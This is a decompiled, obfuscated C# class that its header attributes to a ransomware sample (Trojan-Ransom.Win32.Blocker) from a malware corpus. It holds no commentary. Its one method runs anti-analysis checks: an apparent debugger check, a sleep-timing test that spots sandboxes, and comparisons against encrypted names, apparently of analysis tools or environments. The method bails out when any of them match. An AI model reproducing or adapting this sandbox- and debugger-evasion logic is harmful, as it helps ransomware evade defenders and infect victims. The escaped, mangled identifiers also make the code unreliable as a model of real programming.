// Decompiled with JetBrains decompiler
// Type: .
// Assembly: N0ise, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c9120c1babe06550
// MVID: B2F891D4-C201-4F81-8299-D09EACC947CC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan-Ransom.Win32.Blocker.vmj-deff3c9c03fff36f4920a66464fdae29fc17859fa6ac5029198e6b6c0869fdd6.exe

using \u0001;
using System;

namespace \u0003
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0002 \u0001;

    public bool \u0002()
    {
      if (\u0004.\u0004.\u0001.\u0003)
      {
        try
        {
          if (\u0087\u0003.\u008F\u0002())
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0004)
      {
        try
        {
          long ticks = \u001A\u0002.\u0099().Ticks;
          \u0016\u0002.\u0087\u0002(10);
          if (\u001A\u0002.\u0099().Ticks - ticks < 10L)
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0006)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(483)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0005)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(496)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u000E)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(509)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u000F)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(522)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0002)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(531)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0007)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(540)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0010)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(549)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0014)
      {
        try
        {
          if (\u0004.\u0004.\u0001.\u0002(\u0003.\u0004.\u0001(562)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0008)
      {
        try
        {
          if (\u0083\u0003.\u0080(\u0004.\u0004.\u0001.\u0008(), \u0003.\u0004.\u0001(575)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0013)
      {
        try
        {
          if (\u0083\u0003.\u0080(\u0004.\u0004.\u0001.\u0008(), \u0003.\u0004.\u0001(608)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0011)
      {
        try
        {
          if (\u0083\u0003.\u0080(\u0004.\u0004.\u0001.\u0008(), \u0003.\u0004.\u0001(629)))
            return false;
        }
        catch
        {
        }
      }
      if (\u0004.\u0004.\u0001.\u0012)
      {
        try
        {
          string[] strArray = new string[2]
          {
            \u0003.\u0004.\u0001(666),
            \u0003.\u0004.\u0001(703)
          };
          foreach (string str in strArray)
          {
            if (\u0083\u0003.\u0080(\u0004.\u0004.\u0001.\u0008(), str))
              return false;
          }
        }
        catch
        {
        }
      }
      return true;
    }

    static \u0004() => \u0001.\u0004.\u0002(typeof (\u0003.\u0004));
  }
}
